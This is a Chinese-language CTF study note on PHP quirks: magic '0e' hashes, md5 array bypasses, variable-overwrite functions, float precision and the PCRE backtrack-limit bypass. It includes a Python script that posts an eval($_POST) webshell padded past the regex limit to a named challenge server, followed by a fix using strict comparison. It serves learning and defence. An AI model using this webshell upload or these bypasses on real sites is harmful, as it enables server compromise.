# PHP特性

## 重要函数

|函数名称|作用|特性|
| --- | --- | --- |
|[is_numeric()](https://www.php.net/manual/zh/function.is-numeric.php)|检测变量是否为数字或数字字符串|科学计数法|
|[intval()](https://www.php.net/manual/zh/function.intval.php)|获取变量的整数值|1. 成功时返回`value`的`integer`值，失败时返回`0`。 空的 array 返回     `0`，非空的`array`返回`1`。<br /> 2. 如果 base 是 0，通过检测 value 的格式来决定使用的进制<br />3. 科学计数法，在PHP5.6、7.0与7.1版本表现不一致|
|[preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php)|执行一个正则表达式的搜索和替换|1.`/e`修饰符，代码执行|
|[preg_match()](https://www.php.net/manual/zh/function.preg-match.php)|执行匹配正则表达式|1.数组返回false <br /> 2. 换行 <br /> 3. 回溯次数限制绕过|
|[in_array()](https://www.php.net/manual/zh/function.in-array.php)、[array_search()](https://www.php.net/manual/zh/function.array-search.php)|检查数组中是否存在某个值|如果没有设置strict，则使用松散比较
|[chr()](https://www.php.net/manual/zh/function.chr.php)|返回指定的字符|1. 如果数字大于256，返回`mod 256`|

## 变量覆盖漏洞

变量覆盖漏洞是指通过自定义的参数值控制原有变量值。

- [可变变量`$$`](https://www.php.net/manual/zh/language.variables.variable.php) - 一个变量的变量名可以动态的设置和使用
- [parse_str()](https://www.php.net/manual/zh/function.parse-str.php) - 将字符串解析成多个变量
- [extract()](http://php.adamharvey.name/manual/zh/function.extract.php) - 从数组中将变量导入到当前的符号表
- [import_request_variables()](http://php.adamharvey.name/manual/zh/function.import-request-variables.php) -  将 GET／POST／Cookie 变量导入到全局作用域中

练习题目
  - ISCC_2019_web4

## 浮点数精度绕过

- 在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了
- 常量
	- `NaN`，
	- `INF`，无穷大

- 题目
  - ciscn2020-easytrick

## 哈希函数比较

计算字符串的散列值[md5()](https://www.php.net/manual/zh/function.md5)、[sha1()](https://www.php.net/manual/zh/function.sha1.php)

- 哈希值为`0e`开头的字符串 - `md5('240610708') == md5('QNKCDZO')`


```php
<?php
// 松散比较不等，md5值相等
if ($str1 != $str2) if (md5($str1) == md5($str2)) die($flag);
```

- 数组绕过 - `md5(array)`，如果参数类型为数组，返回`NULL`

```php
<?php
// 原字符串不全等，md5值全等
if ($str1 !== $str2) if (md5($str1) === md5($str2)) die($flag);
if ($str1 !== $str2) if (md5($salt.$str1) === md5($salt.$str2)) die($flag);

// ?a[]=..&b[]=...
```

- [不同的数值构建一样的MD5](https://xz.aliyun.com/t/2232)

```php
// 原字符串不全等，md5值全等
if ((string)$str1 !== (string)$str2) if (md5($str1) === md5($str2)) die($flag);
```

- 字符串的MD5值等于其本身

```php
$str == md5($str)
```

寻找一个`0e`开头的字符串，且其md5值也是`0e`开头。

```php
<?php
for($i;;$i++) if("0e{$i}" == md5("0e{$i}")) die("0e{$i}"); 
# 输出 0e215962017
```

- 截断比较，字符串的md5的指定长度等于某个数

```php
substr(md5($str), 0, 6) == "******"
```

采用暴力碰撞方式

```php
<?php
for($i;;$i++) if(substr(md5($i), 0, 6) == "******") die("$i"); 
```

练习题目
- 2017-HackDatKiwi-md5games1
- 2018-强网杯-web签到


## PCRE回溯次数限制绕过

例题[Code-Breaking Puzzles](https://code-breaking.com/)的[pcrewaf](https://github.com/phith0n/code-breaking/tree/master/2018/pcrewaf)

```php
<?php
// 判断是否是PHP代码
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

// 注意preg_match()的返回值，返回0 或false均满足条件
if(!is_php($input)) {
    // fwrite($f, $input); ...
}
```

PCRE（Perl Compatible Regular Expressions）是一个Perl语言兼容的正则表达式库。PHP采用PCRE库实现正则表达式功能。

默认情况下，量词都是`贪婪`的，也就是说， 它们会在不导致模式匹配失败的前提下，尽可能多的匹配字符(直到最大允许的匹配次数)。

然而，如果一个量词紧跟着一个`?`(问号) 标记，它就会成为懒惰(非贪婪)模式， 它不再尽可能多的匹配，而是尽可能少的匹配。 

`<?php phpinfo();?>//aaaaaa`，执行过程如下：

PCRE的参数回溯次数限制`pcre.backtrack_limit`默认为`1000000`。

如果回溯次数超过限制，`preg_match()`返回`false`，表示只执行失败。

PCRE回溯次数限制绕过的原理是通过发送超长字符串，使正则执行失败，最后绕过目标对PHP语言的限制。

- 贪婪模式
- 对返回值的判断不够严谨

```python
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
print(res.headers)
```

### 修复建议

PHP文档上有关于`preg_match`的警告，应使用全等`===`来测试函数的返回值。
 
```php
<?php
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

if(is_php($input) === 0) {
    // fwrite($f, $input); ...
}
```

[PCRE库](https://www.pcre.org/)

[PHP正则表达式文档](https://www.php.net/manual/zh/book.pcre.php)

https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html